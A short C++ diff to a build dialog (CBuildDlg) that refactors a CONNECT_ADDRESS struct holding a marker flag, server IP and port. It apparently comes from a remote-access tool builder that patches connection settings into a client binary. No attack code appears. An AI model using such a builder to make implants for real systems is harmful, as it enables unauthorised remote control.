@@ -13,12 +13,7 @@ IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)
 
 int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);
 
-struct CONNECT_ADDRESS
-{
-	DWORD dwFlag;
-	char  szServerIP[MAX_PATH];
-	int   iPort;
-}g_ConnectAddress={0x1234567,"",0};
+CONNECT_ADDRESS g_ConnectAddress={ FLAG_FINDEN,"",0};
 
 CBuildDlg::CBuildDlg(CWnd* pParent)
 	: CDialog(CBuildDlg::IDD, pParent)
